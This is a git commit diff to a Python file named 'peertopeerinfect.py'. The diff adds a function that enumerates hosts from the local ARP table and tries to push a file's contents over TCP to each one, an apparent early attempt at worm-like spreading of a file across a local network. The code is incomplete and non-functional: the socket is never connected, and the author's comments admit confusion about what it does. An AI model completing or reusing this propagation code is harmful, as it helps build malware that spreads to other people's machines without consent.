f179b50b431cfbac407983b48a637906e2375d47
sunset-hue <sunsetree@proton.me>
2025-06-22 20:00:43 -0700

    Finished TCP transfer, needs debugging

--- takoyaki/peertopeerinfect.py
+++ takoyaki/peertopeerinfect.py
@@ -2,6 +2,7 @@
 
 import subprocess
 import re
+import socket
 
 
 def FormatARPTable():
@@ -11,7 +12,20 @@ def FormatARPTable():
     formatted = {}
     for line in re.findall('([-.0-9]+)\\s+([-0-9a-f]{17})\\s+(\\w+)',connected):
         # regex from this link on StackOverflow: https://stackoverflow.com/questions/59857314/how-can-i-get-the-arp-table-from-a-windows-machine-using-python
+        # don't delete double slashes, used as escape character representing '\'
         formatted[line[0]] = line[1],line[2]
     return formatted
 
-print(FormatARPTable())
+
+def TransferWithTCP(url: str,path_to_file: str):
+    # transfers file into other computers through TCP
+    with open(path_to_file,"rb") as f:
+        packet = f.read(65536)
+        conn = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        # max size you can send through TCP
+        for ip in FormatARPTable().keys():
+            conn.send(packet)
+            # not quite sure what this does yet:
+            # TODO:
+            # - find what this actually does and if it downloads
+            # - see if this is basically FTP
